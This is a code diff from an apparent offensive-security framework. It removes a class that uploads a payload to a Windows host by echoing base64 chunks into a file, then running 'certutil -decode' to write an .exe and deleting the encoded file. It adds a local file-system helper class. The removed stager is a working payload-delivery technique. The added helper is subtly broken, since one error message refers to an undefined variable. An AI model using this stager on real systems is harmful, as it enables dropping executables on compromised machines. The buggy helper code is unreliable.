@@ -24,39 +24,42 @@
 # SOFTWARE.
 #
 
+import os
+
 from hatsploit.core.cli.badges import Badges
-from pex.tools.string import StringTools
 
 
-class Certutil(StringTools):
+class FSTools:
     badges = Badges()
 
-    def push(self, data, sender, location, args=[], linemax=100):
-        decode_stream = "certutil -decode {}.b64 {}.exe & del {}.b64"
+    def exists(self, path):
+        if os.path.isdir(path):
+            return True, True
+        directory = os.path.split(path)[0]
 
-        echo_stream = "echo {} >> {}.b64"
-        echo_max_length = linemax
+        if not directory:
+            return True, False
 
-        data = self.base64_string(data, encoded=True)
+        if self.exists_dir(directory):
+            return True, False
+        return False, False
 
-        size = len(data)
-        num_parts = int(size / echo_max_length) + 1
+    def exists_dir(self, path):
+        if os.path.exists(path):
+            if not os.path.isdir(path):
+                self.badges.print_error(f"Error: {path}: not a directory!")
+                return False
+            return True
 
-        for i in range(0, num_parts):
-            current = i * echo_max_length
-            block = data[current:current + echo_max_length]
+        self.badges.print_error(f"Local directory: {directory}: does not exist!")
+        return False
 
-            self.badges.print_process(f"Uploading... ({str(current)}/{str(size)})", end='')
-            if block:
-                command = echo_stream.format(block, location)
+    def exists_file(self, path):
+        if os.path.exists(path):
+            if os.path.isdir(path):
+                self.badges.print_error(f"Error: {path}: not a file!")
+                return False
+            return True
 
-                if isinstance(args, dict):
-                    sender(command, **args)
-                else:
-                    sender(*args, command)
-
-        command = decode_stream.format(location, location, location)
-        if isinstance(args, dict):
-            sender(command, **args)
-        else:
-            sender(*args, command)
+        self.badges.print_error(f"Local file: {path}: does not exist!")
+        return False
